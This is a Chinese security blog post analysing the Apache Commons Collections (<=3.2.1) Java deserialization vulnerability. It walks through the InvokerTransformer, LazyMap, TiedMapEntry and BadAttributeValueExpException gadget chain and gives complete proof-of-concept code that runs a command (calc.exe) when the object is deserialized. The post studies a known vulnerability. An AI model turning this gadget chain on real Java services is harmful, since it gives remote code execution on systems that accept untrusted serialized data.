
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="离怀秋">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="article:author" content="离怀秋">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-Apache-Common-Collections-反序列化分析学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2020-05-13T03:11:32.000Z" itemprop="datePublished">2020-05-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>状态有点不好 感觉对什么都提不起来兴趣…希望能快点好吧..</p>
<h3 id="漏洞组件"><a href="#漏洞组件" class="headerlink" title="漏洞组件"></a>漏洞组件</h3><p>Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库</p>
<p>漏洞版本&lt;=3.2.1</p>
<p>起一个maven项目,pom.xml内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Common-Collections Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>Common-Collections<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞基础利用"><a href="#漏洞基础利用" class="headerlink" title="漏洞基础利用"></a>漏洞基础利用</h4><p>主要漏洞利用点在InvokerTransformer.class的transform方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出传参一个Object，然后通过反射进行任意的方法调用，定位下iMethodName和iParamTypes变量</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在初始化类的时候进行了变量的定义，所以这些都是我们可控的地方，也就是可以通过InvokerTransformer类进行任意类任意方法的调用。</p>
<p>但是仅仅这样无法满足java的命令执行，对于PHP而言,只需要简单的system(‘xx’)这样的函数形式即可执行命令，但对于Java来讲命令执行通常为：Runtime.getRuntime().exec(cmd),所以我们必须要进行多次调用，把第一次调用后的结果传给后面一直执行，所以这里是需要多次调用transform方法才可以达到命令执行的目的，所以要找一个可以多次调用transform的函数</p>
<p>ChainedTransformer.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造函数会把传进来的对象数组赋值给iTransformers变量，可以看到这里可以通过循环把每一次通过transform得到object作为参数再传给下一次使用，这样就符合了我们之前需要达到的要求.</p>
<p>看一下简单利用的poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要解释下对于getMethod的反射为什么是两个class (String.class和class[].class)，翻下getMethod函数的源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NoSuchMethodException, SecurityException </span>&#123;</span><br><span class="line">    checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), <span class="keyword">true</span>);</span><br><span class="line">    Method method = getMethod0(name, parameterTypes, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(getName() + <span class="string">"."</span> + name + argumentTypesToString(parameterTypes));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到如果需要反射getMethod方法，需要两个参数第一个自然就是String.class，第二个参数是可变数量的泛型class，所以第二个需要传参Class[].class ，同理，invoke也是如此，就不再赘述了。</p>
<h4 id="进阶反序列化"><a href="#进阶反序列化" class="headerlink" title="进阶反序列化"></a>进阶反序列化</h4><p>上面介绍的只是一些主要的触发点，如果要达到反序列化直接触发的话，还是差一些的，我们需要的是直接通过readObject触发，上面的话还需要再调用一次transform方法，所以需要找到一些调用链来使得tranform自动调用</p>
<p>LazyMap.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于LazyMap的构造函数，如果第二个参数是Transformer类，则会将这个参数赋值给factory变量给下面的get方法进行使用.</p>
<p>在LazyMap的get函数中，如果map中不包含传进来的键值的话，则会调用this.factory的transform方法，所以这里可以将factory设置为ChainedTransformer类，这样我们就可以控制factory了，接下来找下get方法的调用</p>
<p>TiedMapEntry.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显可以看出 this.map和我们的lazymap很合适，接着找下getValue的调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>java的toString其实是和php一样的，当对象被当作字符串调用时，触发toString</p>
<p>其实这里如果把反序列化后的对象直接打印出来，确实可以触发，但是还是不算直接触发，这里可以找一个重写过的readObject方法完成这个操作：</p>
<p>BadAttributeValueExpException.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">       Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">           val = <span class="keyword">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">           val= valObj;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">           val = valObj.toString();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">           val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>取出val变量，进行一系列字符串操作，如果我们把这个val变量设置为TiedMapEntry类的话，在程序运行到if(valObj == null)的时候就会触发toString，完成一系列调用,不过这个val变量是私有的，需要通过反射来进行设置变量，最终完整poc如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"lih3iu"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException ins = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Field valfield = ins.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(ins, entry);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><ul>
<li>通过取出val中的TiedMapEntry</li>
<li>触发toString函数</li>
<li>触发getValue函数</li>
<li>触发<code>this.map.get(this.key)</code> Map类为lazymap,key随意</li>
<li>触发this.factory.transform(key)，factory为ChainedTransformer类</li>
<li>最终执行命令</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/java反序列化学习之apache-commons-collections/" target="_blank" rel="noopener">https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%a6%e4%b9%a0%e4%b9%8bapache-commons-collections/</a></p>
<p><a href="https://xz.aliyun.com/t/4711" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711</a></p>
<p><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/" data-id="ckabsu37o0007kkvrd1k45wk2" class="article-share-link" data-share="baidu" data-title="Apache Common Collections 反序列化分析学习">Share</a>
      

      
        <a href="http://yoursite.com/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-intigriti-Easter-XSS-challenge" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/12/intigriti-Easter-XSS-challenge/" class="article-date">
  <time datetime="2020-05-12T01:31:23.000Z" itemprop="datePublished">2020-05-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>文章首发于先知</p>
